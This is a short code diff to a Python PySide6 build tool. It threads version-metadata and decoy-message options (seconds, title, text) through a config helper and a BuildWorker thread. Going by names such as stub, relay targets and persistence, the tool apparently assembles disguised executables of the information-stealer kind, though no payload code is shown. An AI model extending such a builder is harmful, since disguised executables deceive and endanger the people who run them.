@@ -24,7 +24,7 @@ from typing import Any, Final
 from PySide6.QtCore import QThread, Signal
 
 from core import pipeline
-from core.schema import RelayConfig, RelayTarget, RunConfig, SourceConfig
+from core.schema import RelayConfig, RelayTarget, RunConfig, SourceConfig, VersionConfig
 
 __all__ = ["SOURCE_LABELS", "BuildWorker"]
 
@@ -53,6 +53,10 @@ def config_from(
     keep_local: bool = False,
     persist: bool = False,
     persist_hours: int = 0,
+    version: VersionConfig | None = None,
+    decoy_seconds: int = 0,
+    decoy_title: str = "",
+    decoy_text: str = "",
 ) -> RunConfig:
     """Assemble a ``RunConfig`` from raw form values.
 
@@ -88,6 +92,10 @@ def config_from(
         keep_local=keep_local,
         persist=persist,
         persist_hours=persist_hours,
+        version=version if version is not None else VersionConfig(),
+        decoy_seconds=decoy_seconds,
+        decoy_title=decoy_title,
+        decoy_text=decoy_text,
     )
 
 
@@ -115,6 +123,7 @@ class BuildWorker(QThread):
         stub: Path | None,
         icon: Path | None = None,
         fuse: Path | None = None,
+        version: VersionConfig | None = None,
         parent: Any = None,
     ) -> None:
         super().__init__(parent)
@@ -126,6 +135,7 @@ class BuildWorker(QThread):
         self._stub = stub
         self._icon = icon
         self._fuse = fuse
+        self._version = version
         self._cancelled = False
 
     # --- control -------------------------------------------------------------
@@ -150,6 +160,7 @@ class BuildWorker(QThread):
                 stub=self._stub,
                 icon=self._icon,
                 fuse=self._fuse,
+                version=self._version,
                 progress=self._on_progress,
                 cancel=self._cancel_requested,
             )
